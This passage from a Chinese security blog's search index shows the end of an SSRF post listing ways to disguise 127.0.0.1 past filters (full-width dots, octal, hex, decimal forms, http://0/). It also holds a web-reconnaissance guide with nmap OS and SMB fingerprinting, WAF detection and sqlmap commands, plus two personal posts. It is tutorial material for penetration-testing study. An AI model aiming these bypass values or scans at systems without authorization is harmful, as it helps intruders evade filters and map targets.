ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol start="11"><li>利用句号</li></ol><pre class="line-numbers language-bash"><code class="language-bash">127。0。0。1  <span class="token operator">>></span><span class="token operator">></span>  127.0.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="12"><li>利用进制转换</li></ol><pre class="line-numbers language-basic"><code class="language-basic">可以是十六进制，八进制等。<span class="token number">115.239</span><span class="token number">.210.26</span>  <span class="token operator">></span><span class="token operator">></span><span class="token operator">></span>  <span class="token number">16373751032</span>首先把这四段数字给分别转成<span class="token number">16</span>进制，结果：<span class="token number">73</span> ef d2 <span class="token number">1</span>a然后把 <span class="token number">73</span>efd21a 这十六进制一起转换成<span class="token number">8</span>进制记得访问的时候加<span class="token number">0</span>表示使用八进制<span class="token punctuation">(</span>可以是一个<span class="token number">0</span>也可以是多个<span class="token number">0</span>，跟XSS中多加几个<span class="token number">0</span>来绕过过滤一样<span class="token punctuation">)</span>，十六进制加<span class="token number">0</span>xhttp<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">115.239</span><span class="token number">.210.26</span><span class="token operator">/</span>  <span class="token operator">></span><span class="token operator">></span><span class="token operator">></span>  http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">016373751032</span><span class="token operator">/</span>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token number">.0.1</span><span class="token operator">/</span>  <span class="token operator">></span><span class="token operator">></span><span class="token operator">></span>  http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">0177.0</span><span class="token number">.0.1</span><span class="token operator">/</span>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token number">.0.1</span><span class="token operator">/</span>  <span class="token operator">></span><span class="token operator">></span><span class="token operator">></span>  http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">2130706433</span><span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="13"><li>利用特殊地址</li></ol><pre class="line-numbers language-basic"><code class="language-basic">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">0</span><span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> WEB安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB安全 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB安全-信息收集</title>
      <link href="/post/77929c1c.html"/>
      <url>/post/77929c1c.html</url>
      
        <content type="html"><![CDATA[<h1 id="WEB-安全之信息收集"><a href="#WEB-安全之信息收集" class="headerlink" title="WEB 安全之信息收集"></a>WEB 安全之信息收集</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>对于 WEB 渗透测试来说，信息收集是第一步，也是至关重要不可忽略的一步，说是对渗透的结果起到决定性作用也不为过。<br>本文将结合笔者以往信息收集的经验，综合介绍在进行 WEB 渗透测试时，需要收集哪些信息，以及各种信息收集的方法。</p><h2 id="需要收集哪些信息"><a href="#需要收集哪些信息" class="headerlink" title="需要收集哪些信息"></a>需要收集哪些信息</h2><p>对于以下的信息，收集的越详细越好</p><ul><li>域名、子域名</li><li>Whois 信息</li><li>IP</li><li>DNS 信息</li><li>开放的端口及运行的服务</li><li>服务器操作系统</li><li>服务器类型</li><li>开发语言</li><li>开发框架</li><li>网站架构</li><li>CMS 类型</li><li>CDN 类型</li><li>WAF 类型</li><li>网站目录</li><li>同 IP 网站</li><li>SSL 证书</li></ul><h2 id="收集方法"><a href="#收集方法" class="headerlink" title="收集方法"></a>收集方法</h2><h3 id="域名、子域名"><a href="#域名、子域名" class="headerlink" title="域名、子域名"></a>域名、子域名</h3><h4 id="收集方法-1"><a href="#收集方法-1" class="headerlink" title="收集方法"></a>收集方法</h4><ul><li>搜索引擎【site:xxx.com】</li><li>IP 反查域名</li><li>SSL 查询子域名</li><li>DNS 记录查询子域名</li><li>子域名枚举</li></ul><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><ul><li><a href="https://x.threatbook.cn/">微步在线</a></li><li><a href="https://censys.io/">Censys</a></li><li>Layer 子域名挖掘机</li></ul><h3 id="Whois-信息查询"><a href="#Whois-信息查询" class="headerlink" title="Whois 信息查询"></a>Whois 信息查询</h3><ul><li><a href="https://whois.aliyun.com/">阿里云 Whois</a></li><li><a href="https://whois.chinaz.com/">站长之家 Whois</a></li></ul><h3 id="IP"><a href="#IP" class="headerlink" title="IP"></a>IP</h3><h4 id="查网站-IP"><a href="#查网站-IP" class="headerlink" title="查网站 IP"></a>查网站 IP</h4><ul><li><a href="http://www.ce8.com/">测吧</a></li><li><a href="https://www.boce.com/">BOCE</a></li></ul><h4 id="查-IP-详细信息"><a href="#查-IP-详细信息" class="headerlink" title="查 IP 详细信息"></a>查 IP 详细信息</h4><ul><li><a href="https://x.threatbook.cn/">微步在线</a></li><li><a href="https://censys.io/ipv4?q=">Censys</a></li><li><a href="https://www.ipip.net/ip.html">IPIP</a></li></ul><h3 id="DNS-信息"><a href="#DNS-信息" class="headerlink" title="DNS 信息"></a>DNS 信息</h3><h4 id="在线查询"><a href="#在线查询" class="headerlink" title="在线查询"></a>在线查询</h4><ul><li><a href="http://www.ce8.com/assistor/dns">测吧-DNS 查询</a></li><li><a href="https://www.boce.com/dns">BOCE-DNS 查询</a></li></ul><h4 id="本地查询"><a href="#本地查询" class="headerlink" title="本地查询"></a>本地查询</h4><ul><li>nslookup 域名</li><li>CNAME 查询</li></ul><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">nslookup</span> -qt<span class="token operator">=</span>cname 域名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="开放的端口及运行的服务"><a href="#开放的端口及运行的服务" class="headerlink" title="开放的端口及运行的服务"></a>开放的端口及运行的服务</h3><h4 id="查询工具"><a href="#查询工具" class="headerlink" title="查询工具"></a>查询工具</h4><ul><li>Nmap</li><li>Masscan</li><li>Zmap</li></ul><h4 id="使用教程"><a href="#使用教程" class="headerlink" title="使用教程"></a>使用教程</h4><ul><li><a href="http://www.nmap.com.cn/doc/manual.shtm">Nmap 中文手册</a></li><li><a href="https://mntn0x.github.io/2019/08/02/nmap%E8%84%9A%E6%9C%AC/">Nmap 脚本</a></li><li><a href="https://wooyun.js.org/drops/nmap%E8%84%9A%E6%9C%AC%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93.html">Nmap 脚本使用总结</a></li></ul><h3 id="服务器操作系统"><a href="#服务器操作系统" class="headerlink" title="服务器操作系统"></a>服务器操作系统</h3><h4 id="服务器常用操作系统"><a href="#服务器常用操作系统" class="headerlink" title="服务器常用操作系统"></a>服务器常用操作系统</h4><ol><li>Linux 系列<ul><li>Centos</li><li>Ubuntu</li><li>Debian</li><li>Fedora</li><li>ArchLinux</li><li>OpenSUSE</li><li>EulerOS</li><li>openEuler</li></ul></li><li>Windows 系列<ul><li>Windows server 2003</li><li>Windows server 2008</li><li>Windows server 2012</li><li>Windows server 2016</li><li>Windows server 2019</li></ul></li></ol><h4 id="鉴别方法"><a href="#鉴别方法" class="headerlink" title="鉴别方法"></a>鉴别方法</h4><ol><li>Nmap 扫描</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 操作系统指纹识别</span>nmap -O IP<span class="token comment" spellcheck="true"># smb-os-discovery.nse:这个脚本会基于SMB协议去判别操作系统,主机名,域名,工作组和当前的时间</span>nmap IP -p 139,445 --script<span class="token operator">=</span>smb-os-discovery.nse<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="服务器类型"><a href="#服务器类型" class="headerlink" title="服务器类型"></a>服务器类型</h3><h4 id="常见服务器类型"><a href="#常见服务器类型" class="headerlink" title="常见服务器类型"></a>常见服务器类型</h4><ol><li>Nginx</li><li>Apache</li><li>Tomcat</li><li>Microsoft IIS</li></ol><h4 id="鉴别方法-1"><a href="#鉴别方法-1" class="headerlink" title="鉴别方法"></a>鉴别方法</h4><ol><li>错误页面信息</li><li>HTTP 响应头信息</li><li>HTTP 头字段顺序</li><li>畸形的请求测试</li></ol><h4 id="测试工具"><a href="#测试工具" class="headerlink" title="测试工具"></a>测试工具</h4><ul><li><a href="http://net-square.com/httprint.html">httprint</a></li><li><a href="https://www.computec.ch/projekte/httprecon/">httprecon</a></li></ul><h3 id="开发语言"><a href="#开发语言" class="headerlink" title="开发语言"></a>开发语言</h3><h4 id="识别方法"><a href="#识别方法" class="headerlink" title="识别方法"></a>识别方法</h4><ol><li><p>URL 后缀</p><table><thead><tr><th align="center"><strong>后缀名称</strong></th><th align="center"><strong>编程语言</strong></th></tr></thead><tbody><tr><td align="center">.php</td><td align="center">PHP</td></tr><tr><td align="center">.do</td><td align="center">Java</td></tr><tr><td align="center">.asp</td><td align="center">ASP</td></tr><tr><td align="center">.aspx</td><td align="center">ASP.NET</td></tr><tr><td align="center">.jsp</td><td align="center">JAVA</td></tr></tbody></table></li><li><p>根据开发框架识别</p></li></ol><h3 id="网站架构"><a href="#网站架构" class="headerlink" title="网站架构"></a>网站架构</h3><ol><li>前后端分离</li><li>CDN 集群</li></ol><h3 id="CMS-类型"><a href="#CMS-类型" class="headerlink" title="CMS 类型"></a>CMS 类型</h3><h4 id="识别方法-1"><a href="#识别方法-1" class="headerlink" title="识别方法"></a>识别方法</h4><ol><li>网页结构特征</li><li>网页代码注释</li><li>网页关键字</li><li>URL 特征</li><li>favicon.ico</li></ol><h4 id="识别工具"><a href="#识别工具" class="headerlink" title="识别工具"></a>识别工具</h4><ul><li><a href="https://www.yunsee.cn/">云悉安全平台</a></li><li><a href="https://pentest.gdpcisa.org/whatcms">CMS 识别</a></li><li><a href="http://finger.tidesec.net/">潮汐指纹 TideFinger</a></li></ul><h3 id="CDN-类型"><a href="#CDN-类型" class="headerlink" title="CDN 类型"></a>CDN 类型</h3><h4 id="识别方法-2"><a href="#识别方法-2" class="headerlink" title="识别方法"></a>识别方法</h4><ul><li>查询 DNS 记录</li><li>利用“全球 Ping”，查看 IP 归属</li><li>HTTP 响应头信息</li></ul><h4 id="识别工具-1"><a href="#识别工具-1" class="headerlink" title="识别工具"></a>识别工具</h4><ul><li><a href="http://finger.tidesec.net/">潮汐指纹 TideFinger</a></li><li><a href="http://www.ce8.com/assistor/dns">测吧-DNS 查询</a></li></ul><h3 id="WAF-类型"><a href="#WAF-类型" class="headerlink" title="WAF 类型"></a>WAF 类型</h3><h4 id="识别方法-3"><a href="#识别方法-3" class="headerlink" title="识别方法"></a>识别方法</h4><ul><li>拦截页面的特征【<a href="https://mp.weixin.qq.com/s/3uUZKryCufQ_HcuMc8ZgQQ">看图识 WAF</a>】</li><li>Cookie 值</li><li>HTTP 响应头</li></ul><h4 id="识别工具-2"><a href="#识别工具-2" class="headerlink" title="识别工具"></a>识别工具</h4><ul><li><a href="https://github.com/EnableSecurity/wafw00f">Wafw00f</a></li><li>Nmap</li></ul><pre class="line-numbers language-bash"><code class="language-bash">nmap --script<span class="token operator">==</span>http-waf-fingerprintnmap --script<span class="token operator">=</span>http-waf-detect<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>Sqlmap</li></ul><pre class="line-numbers language-bash"><code class="language-bash">python sqlmap.py -u <span class="token string">"http://xxxx.com"</span> --identify-waf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="网站目录"><a href="#网站目录" class="headerlink" title="网站目录"></a>网站目录</h3><h4 id="收集方法-2"><a href="#收集方法-2" class="headerlink" title="收集方法"></a>收集方法</h4><ol><li>搜索引擎</li></ol><pre><code>inurl:mysite.com</code></pre><ol start="2"><li>爬虫</li><li>信息泄露（开源、Github 搜索）</li><li>目录遍历漏洞</li><li>字典扫描</li></ol><h4 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h4><ul><li>御剑扫描</li><li><a href="https://github.com/c4bbage/WebRobot-v1.8.2">WebRobot</a></li><li><a href="https://github.com/H4ckForJob/dirmap.git">dirmap</a></li></ul><h3 id="同-IP-网站"><a href="#同-IP-网站" class="headerlink" title="同 IP 网站"></a>同 IP 网站</h3><h4 id="查询工具-1"><a href="#查询工具-1" class="headerlink" title="查询工具"></a>查询工具</h4><ul><li><a href="https://x.threatbook.cn/">微步在线</a></li><li><a href="https://fofa.so/">FOFA</a></li><li><a href="https://ti.qianxin.com/">奇安信威胁情报中心</a></li><li><a href="https://ti.dbappsecurity.com.cn/">安恒威胁情报中心</a></li></ul><h3 id="SSL-证书"><a href="#SSL-证书" class="headerlink" title="SSL 证书"></a>SSL 证书</h3><h4 id="查询工具-2"><a href="#查询工具-2" class="headerlink" title="查询工具"></a>查询工具</h4><p><a href="https://censys.io/certificates">Censys</a></p>]]></content>
      
      
      <categories>
          
          <category> WEB安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB安全 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的个人主页和网站</title>
      <link href="/post/89f29c06.html"/>
      <url>/post/89f29c06.html</url>
      
        <content type="html"><![CDATA[<h1 id="我在各大平台的个人主页"><a href="#我在各大平台的个人主页" class="headerlink" title="我在各大平台的个人主页"></a>我在各大平台的个人主页</h1><h2 id="博客类"><a href="#博客类" class="headerlink" title="博客类"></a>博客类</h2><ul><li><a href="https://www.yuque.com/chenhaikun">语雀</a></li><li><a href="https://blog.csdn.net/chk218">CSDN</a></li><li><a href="https://www.zhihu.com/people/chen-hai-kun-41">知乎</a></li><li><a href="https://juejin.cn/user/4248168661807997">掘金</a></li></ul><h2 id="代码类"><a href="#代码类" class="headerlink" title="代码类"></a>代码类</h2><ul><li><a href="https://github.com/truda8">Github</a></li><li><a href="https://gitee.com/chk668">Gitee</a></li></ul><h2 id="设计类"><a href="#设计类" class="headerlink" title="设计类"></a>设计类</h2><ul><li><a href="https://www.zcool.com.cn/u/17586471">ZCOOL 站酷</a></li><li><a href="https://dribbble.com/chk218">Dribbble</a></li></ul><h1 id="个人网站"><a href="#个人网站" class="headerlink" title="个人网站"></a>个人网站</h1><ul><li><a href="https://www.puuuq.cn/">AI 圈导航</a></li><li><a href="https://tryda.puuuq.cn/">Truda Blog</a></li><li><a href="https://favicon.puuuq.cn/">Favicon Search</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Truda Blog</title>
      <link href="/post/5563808f.html"/>
      <url>/post/5563808f.html</url>
      
        <content type="html"><![CDATA[<h2 id="Truda-Blog"><a href="#Truda-Blog" class="headerlink" title="Truda Blog"></a>Truda Blog</h2><h3 id="2020年11月13日，Truda-Blog正式建立"><a href="#2020年11月13日，Truda-Blog正式建立" class="headerlink" title="2020年11月13日，Truda Blog正式建立"></a>2020年11月13日，Truda Blog正式建立</h3><h3 id="基于-Hexo-Github-语雀-的云端写作博客"><a href="#基于-Hexo-Github-语雀-的云端写作博客" class="headerlink" title="基于 Hexo + Github + 语雀 的云端写作博客"></a>基于 Hexo + Github + 语雀 的云端写作博客</h3>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
            <tag> Blog </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
